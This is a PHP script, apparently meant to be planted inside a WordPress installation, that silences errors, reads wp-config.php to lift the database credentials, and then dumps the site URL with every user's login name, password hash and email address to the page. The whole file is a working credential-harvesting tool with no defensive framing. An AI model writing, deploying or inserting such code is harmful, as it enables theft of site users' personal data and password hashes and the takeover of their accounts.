<?php
error_reporting(0);
$db_name = NULL;
$db_user = NULL;
$db_pass = NULL;
$db_host= NULL;
$tbl_preffix = "";
$config = file_get_contents('../../../../wp-config.php');
preg_match_all('/(define\(\')([^\']+)(\',\s*\')([^\']+)/', $config, $matches);
if(is_array($matches)){
	for($i=0;$i<count($matches[2]);$i++){
		if(stristr($matches[2][$i],"DB_NAME"))
			{$db_name=$matches[4][$i];}
		elseif(stristr($matches[2][$i],"DB_USER"))
			{$db_user=$matches[4][$i];}
		elseif(stristr($matches[2][$i],"DB_PASSWORD"))
			{$db_pass=$matches[4][$i];}
		elseif(stristr($matches[2][$i],"DB_HOST"))
			{$db_host=$matches[4][$i];}
    }
}else{
	echo "can't find config information";
	die();
}
if(!empty($db_name)&&!empty($db_user)&&!empty($db_pass)&&!empty($db_host)){
	preg_match('/(\$table_prefix\s*=\s*\')([^\']+)/', $config, $mpreffix);
	if(is_array($mpreffix)&&count($mpreffix)==3){
		$tbl_preffix=$mpreffix[2];
	}
	$users = $tbl_preffix . 'users';
	$options = $tbl_preffix . 'options';
	if(function_exists('mysql_connect')){
		$conn=mysql_connect($db_host,$db_user,$db_pass) or die("error connecting") ;
		mysql_query("set names 'utf8'");
		$sql=mysql_select_db($db_name,$conn);
		$result1 = mysql_query("SELECT option_value FROM $options WHERE option_name = 'siteurl'");
		if($rows=mysql_fetch_array($result1)){
			$domain = $rows['option_value'];
		}
		$result2 = mysql_query("SELECT user_login,user_pass,user_email FROM $users");
		while($row=mysql_fetch_array($result2)){
			$user_login = $row['user_login'];
			$user_pass = $row['user_pass'];
			$user_email = $row['user_email'];
			echo $domain . '|' .$user_login . '|' . $user_pass . '|' . $user_email . '</br>';
		}
	}else{
		$conn=mysqli_connect($db_host,$db_user,$db_pass,$db_name) or die("error connecting") ;
		mysqli_set_charset("set names 'utf8'");
		$result1 = mysqli_query($conn,"SELECT option_value FROM $options WHERE option_name = 'siteurl'");
		if($rows=mysqli_fetch_array($result1)){
			$domain = $rows['option_value'];
		}
		$result2 = mysqli_query($conn,"SELECT user_login,user_pass,user_email FROM $users");
		while($row=mysqli_fetch_array($result2)){
			$user_login = $row['user_login'];
			$user_pass = $row['user_pass'];
			$user_email = $row['user_email'];
			echo $domain . '|' .$user_login . '|' . $user_pass . '|' . $user_email . '</br>';
		}
	}

}else{
	echo "can't get all information.";
}